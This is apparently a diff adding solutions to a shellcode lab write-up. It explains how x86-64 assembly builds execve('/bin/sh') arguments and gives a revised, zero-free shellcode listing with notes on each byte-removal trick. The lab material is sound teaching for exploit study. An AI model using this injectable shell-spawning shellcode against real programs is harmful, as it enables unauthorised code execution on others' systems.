@@ -157,8 +157,8 @@ section .text
         mov [rbx+8], rbx    ; store rbx to memory at address rbx + 8
         mov rax, 0x00       ; rax = 0
         mov [rbx+16], rax   ; store rax to memory at address rbx + 16
-        mov rdi, rbx        ; rdi = rbx ¿
-        lea rsi, [rbx+8]    ; rsi = rbx +8 ¡
+        mov rdi, rbx        ; rdi = rbx (1)
+        lea rsi, [rbx+8]    ; rsi = rbx +8 (2)
         mov rdx, 0x00       ; rdx = 0
         mov rax, 59         ; rax = 59
         syscall
@@ -221,6 +221,29 @@ x/40bx $rsp -- Print out the top 40 bytes of the stack
 x/5gx $rsp -- Print out the top 4 double-word (8 bytes) of the stack
 quit -- Exit from gdb
 ```
+##### solution
+
+ 1. From the compilation and debugging output, we can see the code was successfully compiled and a shell was obtained.(Shellcode/task2_output.txt)
+
+ 2. The program gets the `/bin/sh` string address through the following sequence:
+    - Code jumps to `two`, which executes `call one`
+    - The `call` instruction pushes the address of the next instruction (string location) onto stack
+    - `pop rbx` retrieves this address (0x4000ad) which points to `/bin/sh`
+    - Memory dump shows string bytes at 0x4000ad: `2f 62 69 6e 2f 73 68` (/bin/sh)
+
+ 3. The argv[] array is constructed as:
+    - `mov [rbx+8], rbx` sets argv[0] to point to "/bin/sh" string
+    - `mov [rbx+16], rax` sets argv[1] to NULL (terminator)
+    Memory layout:
+    - rbx -> "/bin/sh"
+    - rbx+8 -> points to "/bin/sh" (argv[0])
+    - rbx+16 -> NULL (argv[1])
+
+ 4. Lines 1-2 prepare execve() arguments:
+    - `mov rdi, rbx` - Line 1 sets first arg (filename) to "/bin/sh" address
+    - `lea rsi, [rbx+8]` - Line 2 sets second arg (argv) to address of argv array
+
+![task2](task2.png)
 
 #### Task 2.b. Eliminate zeros from the code
 
@@ -236,6 +259,76 @@ tions that have zeros in the machine code.
 To eliminate these zeros, you need to rewrite the shellcode mysh64.s, replacing the problematic in-
 structions with an alternative. Section 5 provides some approaches that you can use to get rid of zeros.
 Please show the revised mysh64.s and explain how you get rid of each single zero from the code.
+
+##### solution
+Here's the revised code
+
+(Shellcode/mysh64_no_zero.s)
+
+```nasm
+section .text
+    global _start
+    _start:
+        BITS 64
+        jmp short two
+    one:
+        pop rbx
+
+        ; Zero out al without using immediate zero
+        xor al, al
+        mov [rbx+7], al   ; Null terminate /bin/sh
+
+        ; Store rbx to memory without direct mov
+        push rbx
+        pop qword [rbx+8]  ; Replaces 'mov [rbx+8], rbx'
+
+        ; Zero out rax without immediate zero
+        xor rax, rax      ; Replaces 'mov rax, 0x00'
+        mov [rbx+16], rax ; Store null terminator for argv
+
+        ; Setup execve arguments
+        mov rdi, rbx      ; First arg: command string
+        lea rsi, [rbx+8]  ; Second arg: argv array
+        xor rdx, rdx      ; Third arg: envp=NULL (replaces 'mov rdx, 0x00')
+
+        ; Setup syscall number without immediate value
+        xor rax, rax
+        mov al, 59        ; syscall number for execve
+        syscall
+    two:
+        call one
+        db '/bin/sh', 0xFF    ; Command string (terminated later by code)
+        db 'AAAAAAAA'         ; Placeholder for argv[0]
+        db 'BBBBBBBB'         ; Placeholder for argv[1]
+```
+
+Explanations of the zero-eliminating modifications:
+
+1. **Null terminator for `/bin/sh`**:
+   - Original: `mov byte [rbx+7], 0`
+   - New: Use `xor al, al` to get zero, then `mov [rbx+7], al`
+
+2. **Moving rbx to memory**:
+   - Original: `mov [rbx+8], rbx`
+   - New: Use `push rbx` followed by `pop qword [rbx+8]`
+
+3. **Zeroing rax**:
+   - Original: `mov rax, 0x00`
+   - New: `xor rax, rax`
+
+4. **Zeroing rdx**:
+   - Original: `mov rdx, 0x00`
+   - New: `xor rdx, rdx`
+
+5. **Setting syscall number**:
+   - Original: `mov rax, 59`
+   - New: First `xor rax, rax` then `mov al, 59`
+   - This ensures only the lower byte is set, avoiding zeros in the higher bytes
+
+6. **String termination**:
+   - Original: Immediate zero in string
+   - New: Use 0xFF as placeholder and programmatically write the null terminator
+
 
 #### Task 2.c. Run a more complicated command
 
